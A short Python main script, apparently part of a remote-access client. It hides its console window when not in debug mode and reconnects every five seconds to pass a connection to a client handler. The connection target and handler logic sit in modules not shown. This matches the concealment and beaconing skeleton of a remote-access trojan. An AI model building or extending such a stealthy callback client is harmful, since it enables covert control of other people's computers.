import window_hide
import socket
import connection
import ClientHandler
import time

DEBUG = True

def init():
    if DEBUG == False:
        window_hide.hide_console_window()
        
def try_connect_and_handle():
    conn = connection.make_client_connection()
    ClientHandler.ClientHandler(conn)
    
def main_loop():
    print("Enter main loop")
    while True:
        try_connect_and_handle()
        time.sleep(5)
        
def main():
    init()
    main_loop()

if __name__ == "__main__":
    main()